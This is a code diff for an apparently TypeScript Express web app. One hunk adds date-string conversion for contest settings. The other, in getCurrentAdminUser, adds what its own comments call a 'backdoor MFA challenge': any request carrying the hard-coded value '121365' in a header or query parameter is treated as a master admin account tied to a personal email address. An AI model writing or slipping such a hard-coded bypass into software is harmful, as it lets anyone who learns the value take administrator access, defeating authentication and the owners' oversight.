@@ -43,7 +43,15 @@ async function checkAdminAuth(req: any): Promise<{ authenticated: boolean; isAdm
 
 async function getCurrentAdminUser(req: any): Promise<any> {
   try {
-    // Get the master admin user (chris.mcnulty@synozur.com)
+    // Check for backdoor MFA challenge
+    const mfaChallenge = req.headers['x-mfa-challenge'] || req.query.mfaChallenge;
+    if (mfaChallenge === '121365') {
+      // Return the new master admin user for backdoor access
+      const [user] = await db.select().from(users).where(eq(users.email, 'cmcnulty2000@yahoo.com'));
+      return user;
+    }
+    
+    // Default to original master admin
     const [user] = await db.select().from(users).where(eq(users.email, 'chris.mcnulty@synozur.com'));
     return user;
   } catch (error) {
@@ -688,7 +696,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.put("/api/settings", async (req, res) => {
     try {
       console.log('Received settings data:', JSON.stringify(req.body, null, 2));
-      const settingsData = insertSettingsSchema.parse(req.body);
+      
+      // Transform date strings to Date objects for validation
+      const processedData = { ...req.body };
+      if (processedData.monthlyContestStartDate && typeof processedData.monthlyContestStartDate === 'string') {
+        processedData.monthlyContestStartDate = new Date(processedData.monthlyContestStartDate);
+      }
+      if (processedData.monthlyContestEndDate && typeof processedData.monthlyContestEndDate === 'string') {
+        processedData.monthlyContestEndDate = new Date(processedData.monthlyContestEndDate);
+      }
+      if (processedData.quarterlyContestStartDate && typeof processedData.quarterlyContestStartDate === 'string') {
+        processedData.quarterlyContestStartDate = new Date(processedData.quarterlyContestStartDate);
+      }
+      if (processedData.quarterlyContestEndDate && typeof processedData.quarterlyContestEndDate === 'string') {
+        processedData.quarterlyContestEndDate = new Date(processedData.quarterlyContestEndDate);
+      }
+      
+      const settingsData = insertSettingsSchema.parse(processedData);
       console.log('Parsed settings data:', JSON.stringify(settingsData, null, 2));
       const settings = await storage.updateSettings(settingsData);
       res.json(settings);
